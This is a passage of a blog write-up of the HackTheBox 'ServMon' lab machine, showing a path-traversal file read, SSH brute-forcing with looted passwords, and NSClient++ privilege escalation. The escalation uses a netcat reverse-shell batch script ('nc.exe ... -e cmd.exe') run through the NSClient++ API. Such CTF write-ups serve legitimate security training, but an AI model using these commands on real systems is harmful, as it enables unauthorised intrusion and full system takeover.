+   0  auxiliary/scanner/http/tvt_nvms_traversal  2019-12-12       normal  No     TVT NVMS-1000 Directory Traversal
+
+msf5 &gt; use 0
+msf5 auxiliary(scanner/http/tvt_nvms_traversal) &gt; options
+
+Module options (auxiliary/scanner/http/tvt_nvms_traversal):
+
+   Name       Current Setting   Required  Description
+   ----       ---------------   --------  -----------
+   DEPTH      13                yes       Depth for Path Traversal
+   FILEPATH   /windows/win.ini  yes       The path to the file to read
+   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                       yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
+   RPORT      80                yes       The target port (TCP)
+   SSL        false             no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                 yes       The base URI path of nvms
+   THREADS    1                 yes       The number of concurrent threads (max one per host)
+   VHOST                        no        HTTP server virtual host
+
+msf5 auxiliary(scanner/http/tvt_nvms_traversal) &gt; set RHOSTS 10.10.10.184
+RHOSTS =&gt; 10.10.10.184
+msf5 auxiliary(scanner/http/tvt_nvms_traversal) &gt; set FILEPATH /Users/Nathan/Desktop/Passwords.txt
+FILEPATH =&gt; /Users/Nathan/Desktop/Passwords.txt
+msf5 auxiliary(scanner/http/tvt_nvms_traversal) &gt; run
+
+[+] 10.10.10.184:80 - Downloaded 156 bytes
+[+] File saved in: /home/cyfun/.msf4/loot/20200611175532_default_10.10.10.184_nvms.traversal_675310.txt
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf5 auxiliary(scanner/http/tvt_nvms_traversal)
+
+$ cat /home/cyfun/.msf4/loot/20200611175532_default_10.10.10.184_nvms.traversal_675310.txt
+1nsp3ctTh3Way2Mars!
+Th3r34r3To0M4nyTrait0r5!
+B3WithM30r4ga1n5tMe
+L1k3B1gBut7s@W0rk
+0nly7h3y0unGWi11F0l10w
+IfH3s4b0Utg0t0H1sH0me
+Gr4etN3w5w17hMySk1Pa5$
+</code></pre><h3 id=network-exploitation-ssh>Network exploitation: SSH<a hidden class=anchor aria-hidden=true href=#network-exploitation-ssh>#</a></h3><p>With the looted passwords let&rsquo;s bruteforce SSH for the users nadine and nathan
+by using a <a href=https://www.metasploit.com/>metasploit</a> module.</p><pre tabindex=0><code>msf5 auxiliary(scanner/ssh/ssh_login) &gt; set RHOSTS 10.10.10.184
+RHOSTS =&gt; 10.10.10.184
+msf5 auxiliary(scanner/ssh/ssh_login) &gt; set PASS_FILE /home/cyfun/.msf4/loot/20200611175532_default_10.10.10.184_nvms.traversal_675310.txt
+PASS_FILE =&gt; /home/cyfun/.msf4/loot/20200611175532_default_10.10.10.184_nvms.traversal_675310.txt
+msf5 auxiliary(scanner/ssh/ssh_login) &gt; set USER_FILE /home/cyfun/CTF/HackTheBox/machines/ServMon/usernames.txt
+USER_FILE =&gt; /home/cyfun/CTF/HackTheBox/machines/ServMon/usernames.txt
+msf5 auxiliary(scanner/ssh/ssh_login) &gt; run
+
+[+] 10.10.10.184:22 - Success: &#39;nadine:L1k3B1gBut7s@W0rk&#39; &#39;&#39;id&#39; is not recognized as an internal or external command,  operable program or batch file.  &#39;
+[*] Command shell session 1 opened (10.10.15.26:45331 -&gt; 10.10.10.184:22) at 2020-06-11 18:10:19 +0200
+[-] 10.10.10.184:22 - While a session may have opened, it may be bugged.  If you experience issues with it, re-run this module with &#39;set gatherproof off&#39;.  Also consider submitting an issue at github.com/rapid7/metasploit-framework with device details so it can be handled in the future.
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre><p>So a valid set of credentials was <code>nadine:L1k3B1gBut7s@W0rk</code>.</p><p><a href=https://www.metasploit.com/>metasploit</a> automatically opened us a session but with <code>cmd.exe</code>. But I prefer
+to have a powershell shell.</p><pre tabindex=0><code>$ ssh nadine@10.10.10.184 powershell.exe
+nadine@10.10.10.184&#39;s password: 
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\Users\Nadine&gt;
+</code></pre><p>Let&rsquo;s get our user flag:</p><pre tabindex=0><code>PS C:\Users\Nadine&gt; gc Desktop\user.txt
+f9dc9b5ab530d6d295219c156662c3c9
+</code></pre><h3 id=privilege-escalation--through-nsclient-nadine-to-nt-authoritysystem>Privilege Escalation through NSClient++: Nadine to NT Authority\SYSTEM<a hidden class=anchor aria-hidden=true href=#privilege-escalation--through-nsclient-nadine-to-nt-authoritysystem>#</a></h3><p>Remember of the hypothesis I made about <code>NSClient++</code>. Let&rsquo;s read EDB-ID 46802
+again.</p><p>We can use the CLI tool to display the password:</p><pre tabindex=0><code>PS C:\Users\Nadine&gt; cd &#34;C:\Program Files\NSClient++&#34;
+PS C:\Program Files\NSClient++&gt; .\nscp web -- password --display
+Current password: ew2x6SsGTxjRwXOT
+</code></pre><p>By trying to login with the password at https://10.10.10.184:8443/index.html
+we are denied.</p><p>But if we read the config file <code>gc "c:\program files\nsclient++\nsclient.ini"</code>
+we can see something.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ini data-lang=ini><span style=display:flex><span><span style=color:#75715e># If you want to fill this file with all available options run the following command:</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#   nscp settings --generate --add-defaults --load-all</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># If you want to activate a module and bring in all its options use:</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#   nscp settings --activate-module &lt;MODULE NAME&gt; --add-defaults</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># For details run: nscp settings --help</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; in flight - TODO</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>[/settings/default]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Undocumented key</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>password</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>ew2x6SsGTxjRwXOT</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Undocumented key</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>allowed hosts</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>127.0.0.1</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; in flight - TODO</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>[/settings/NRPE/server]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Undocumented key</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>ssl options</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>no-sslv2,no-sslv3</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Undocumented key</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>verify mode</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>peer-cert</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Undocumented key</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>insecure</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>false</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; in flight - TODO</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>[/modules]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Undocumented key</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>CheckHelpers</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>disabled</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Undocumented key</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>CheckEventLog</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>disabled</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Undocumented key</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>CheckNSCP</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>disabled</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Undocumented key</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>CheckDisk</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>disabled</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Undocumented key</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>CheckSystem</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>disabled</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Undocumented key</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>WEBServer</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>enabled</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Undocumented key</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>NRPEServer</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>enabled</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; CheckTaskSched - Check status of your scheduled jobs.</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>CheckTaskSched</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>enabled</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Scheduler - Use this to schedule check commands and jobs in conjunction with for instance passive monitoring through NSCA</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Scheduler</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>enabled</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; CheckExternalScripts - Module used to execute external scripts</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>CheckExternalScripts</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>enabled</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Script wrappings - A list of templates for defining script commands. Enter any command line here and they will be expanded by scripts placed under the wrapped scripts section. %SCRIPT% will be replaced by the actual script an %ARGS% will be replaced by any given arguments.</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>[/settings/external scripts/wrappings]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Batch file - Command used for executing wrapped batch files</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>bat</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>scripts\\%SCRIPT% %ARGS%</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Visual basic script - Command line used for wrapped vbs scripts</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>vbs</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>cscript.exe //T:30 //NoLogo scripts\\lib\\wrapper.vbs %SCRIPT% %ARGS%</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; POWERSHELL WRAPPING - Command line used for executing wrapped ps1 (powershell) scripts</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>ps1</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>cmd /c echo If (-Not (Test-Path &#34;scripts\%SCRIPT%&#34;) ) { Write-Host &#34;UNKNOWN: Script `&#34;%SCRIPT%`&#34; not found.&#34;; exit(3) }; scripts\%SCRIPT% $ARGS$; exit($lastexitcode) | powershell.exe /noprofile -command -</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; External scripts - A list of scripts available to run from the CheckExternalScripts module. Syntax is: `command=script arguments`</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>[/settings/external scripts/scripts]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Schedules - Section for the Scheduler module.</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>[/settings/scheduler/schedules]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Undocumented key</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>foobar</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>command = foobar</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; External script settings - General settings for the external scripts module (CheckExternalScripts).</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>[/settings/external scripts]</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>allow arguments</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>true</span>
+</span></span></code></pre></div><p><code>allowed hosts = 127.0.0.1</code> tells us we can authenticate only from localhost.</p><p>But as we have an SSH access we can do some local port forwarding (you can read
+about this technique on my <a href=https://orangecyberdefense.com/fr/insights/blog/ethical_hacking/etat-de-lart-du-pivoting-reseau-en-2019/>article about pivoting</a>).</p><pre tabindex=0><code>$ ssh nadine@10.10.10.184 -L 127.0.0.1:9999:127.0.0.1:8443 -N
+</code></pre><p>We map the local port 8443 on ServMon machine to local port 9999 on our machine.</p><p>Now we should be able to authenticate at https://127.0.0.1:9999/ with password
+<code>ew2x6SsGTxjRwXOT</code>.</p><p>Now the exploit tell us to enable some modules:</p><ul><li>CheckExternalScripts</li><li>Scheduler</li></ul><p>Now let&rsquo;s prepare our backdoor script: <code>cyfun.bat</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bat data-lang=bat><span style=display:flex><span>@<span style=color:#66d9ef>echo</span> off
+</span></span><span style=display:flex><span>c:\temp\nc.exe<span style=color:#75715e> 10.10.15.26 8888 -e cmd.exe</span>
+</span></span></code></pre></div><p>We can try to download the bat script with <a href=https://lolbas-project.github.io/lolbas/Binaries/Certutil/#download>Certutil</a>
+and a local HTTP server.</p><pre tabindex=0><code>$ python -m http.server --bind 10.10.15.26
+</code></pre><p>But that&rsquo;s a failure:</p><pre tabindex=0><code>PS C:\Users\Nadine&gt; cd C:\temp
+
+PS C:\temp&gt; certutil.exe -urlcache -split -f http://10.10.15.26:8000/cyfun.bat cyfun.bat
+At line:1 char:1
++ certutil.exe -urlcache -split -f http://10.10.15.26:8000/cyfun.bat no ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+</code></pre><p>We can&rsquo;t download our script because it&rsquo;s blocked by an AV. So let&rsquo;s create is on
+the server directly.</p><pre tabindex=0><code>PS C:\temp&gt; echo &#34;@echo off&#34; &gt; cyfun.bat
+PS C:\temp&gt; echo &#34;c:\temp\nc.exe 10.10.15.26 8888 -e cmd.exe&#34; &gt;&gt; cyfun.bat
+PS C:\temp&gt; gc cyfun.bat
+@echo off
+c:\temp\nc.exe 10.10.15.26 8888 -e cmd.exe
+</code></pre><p>I tried to download <code>nc.exe</code> with certutils but it was blocked by the AV too.</p><p>So I downloaded it via scp:</p><pre tabindex=0><code>$ scp nc.exe nadine@10.10.10.184:/temp/nc.exe
+</code></pre><p>I tried to create the RCE via the webUI as in the exploit but wasn&rsquo;t successful.</p><ul><li>https://127.0.0.1:9999/index.html#/settings/settings/external%20scripts/scripts</li><li>https://127.0.0.1:9999/index.html#/settings/settings/scheduler/schedules</li></ul><p>So instead I created the task via the API:</p><pre tabindex=0><code>$ curl -s -k -u admin:ew2x6SsGTxjRwXOT -X PUT https://127.0.0.1:9999/api/v1/scripts/ext/scripts/cyfun.bat --data-binary &#34;c:\temp\nc.exe 10.10.15.26 8888 -e cmd.exe&#34;
+Added cyfun as scripts\cyfun.bat
+
+$ curl -s -k -u admin:ew2x6SsGTxjRwXOT https://127.0.0.1:9999/api/v1/queries/cyfun/commands/execute\?time\=1m
+{&#34;command&#34;:&#34;cyfun&#34;,&#34;lines&#34;:[{&#34;message&#34;:&#34;Command cyfun didn&#39;t terminate within the timeout period 60s&#34;,&#34;perf&#34;:{}}],&#34;result&#34;:3}
+</code></pre><p>And finally got a privileged shell:</p><pre tabindex=0><code>$ nc -nlp 8888
+Microsoft Windows [Version 10.0.18363.752]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Program Files\NSClient++&gt;whoami
+nt authority\system
+
+C:\Program Files\NSClient++&gt;type c:\users\administrator\desktop\root.txt
+72c07cb24f21e63a855346edcd0816cb
+</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/windows/>Windows</a></li><li><a href=https://s4ch.github.io/tags/easy/>Easy</a></li></ul><nav class=paginav><a class=prev href=https://s4ch.github.io/writeups/hackthebox/forwardslash/><span class=title>« Prev</span><br><span>ForwardSlash </span></a><a class=next href=https://s4ch.github.io/writeups/hackthebox/monteverde/><span class=title>Next »</span><br><span>Monteverde</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>
